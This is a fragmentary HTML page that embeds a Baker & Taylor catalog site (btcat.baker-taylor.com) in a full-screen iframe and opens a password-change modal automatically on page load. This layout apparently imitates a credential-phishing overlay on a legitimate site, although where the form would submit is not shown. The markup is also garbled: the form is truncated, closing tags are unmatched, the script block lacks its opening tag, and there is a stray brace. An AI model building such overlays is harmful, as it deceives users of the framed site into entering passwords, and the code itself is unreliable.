<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Responsive Iframe with Popup Form</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
        }

        .iframe-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%; /* 16:9 aspect ratio (change to match your video's aspect ratio) */
            overflow: hidden;
        }

        .iframe-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
        }

        .modal-content {
            background-color: #f7f7f7;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #ddd;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 5px;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
        }

        h2 {
            margin: 0;
            margin-bottom: 20px;
            text-align: center;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            margin-bottom: 8px;
        }

        input {
            padding: 8px;
            margin-bottom: 16px;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            font-size: 16px;
            padding: 10px;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

                <input type="password" id="newPassword" required>
                <input type="submit" value="Submit">

        </div>
    </div>

    <div class="iframe-container">
        <!-- Replace 'your_iframe_url_here' with the URL of your iframe content -->
        <iframe src="https://btcat.baker-taylor.com" frameborder="0" allowfullscreen></iframe>
    </div>

        window.onload = function() {
            openPasswordChangeForm();
        };

        // Open the modal
        function openPasswordChangeForm() {
            const modal = document.getElementById("passwordChangeModal");
            modal.style.display = "block";
        }

        // Close the modal
        function closePasswordChangeForm() {
            const modal = document.getElementById("passwordChangeModal");
            modal.style.display = "none";
        }

        }
    </script>
</body>
</html>
